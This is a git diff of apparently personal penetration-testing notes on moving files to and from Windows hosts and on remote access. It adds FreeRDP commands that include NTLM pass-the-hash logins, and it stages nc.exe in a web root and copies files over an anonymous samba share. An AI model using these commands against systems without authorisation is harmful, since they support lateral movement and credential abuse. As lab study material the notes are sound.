@@ -2,10 +2,33 @@
 
 * Use kali linux NC windows binary
 * Locate file transfer utilities on Windows systems
+* File copy to/from anonymous samba share with copy
 * Download a file using certutil
 * Download a file using bitsadmin
 * Download a file with PowerShell
 * Upload a file with PowerShell
+
+## FreeRDP - A Free Remote Desktop Protocol
+
+* +clipboard
+* +auto-reconnect
+* /cert:ignore
+* /dynamic-resolution
+* /v: server
+* /pth: pass-the hash NTLM
+* /list-kbd show avaliable keyboards
+
+```bash
+
+xfreerdp3 +clipboard +auto-reconnect /u:DOMAIN\\user /p:password /v:remote-ip
+xfreerdp3 /list:kbd
+
+# RDP User/Password
+xfreerdp3 /u:user /v:ip /p:password /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
+# RDP NTLM Pass-the-hash 
+xfreerdp3 /u:user /v:ip /pth:hidden /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
+ 
+```
 
 ## Use Kali Linux NC windows-binary
 
@@ -19,21 +42,12 @@ windows-binaries -h
 sudo cp /usr/share/windows-binaries/nc.exe /var/www/html/
 ```
 
-## FreeRSD - A Free Remote Desktop Protocol
+## Window file copy to and from anonymous samba share
 
-* +clipboard
-* +auto-reconnect
-* /dynamic-resolution
-* /v: server
-* /pth: NTLM hash
-* /kbd-list
-
-```bash
-xfreerdf /kdb-list
-xfreerdp +clipboard +auto-reconnect /u:user /p:password /v:remote-ip
-xfreerdp /u:user /v:ip /p:password /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
-xfreerdp /u:user /v:ip /pth:hidden /kbd:0x00010407 /dynamic-resolution +auto-reconnect +clipboard
- 
+```shells
+# upload and download
+copy .\path\to\file \\REMOTE-IP\share\upload
+copy \\REMOTE-IP\share\download copy .\path\to\file
 ```
 
 ## Download a file using certutil
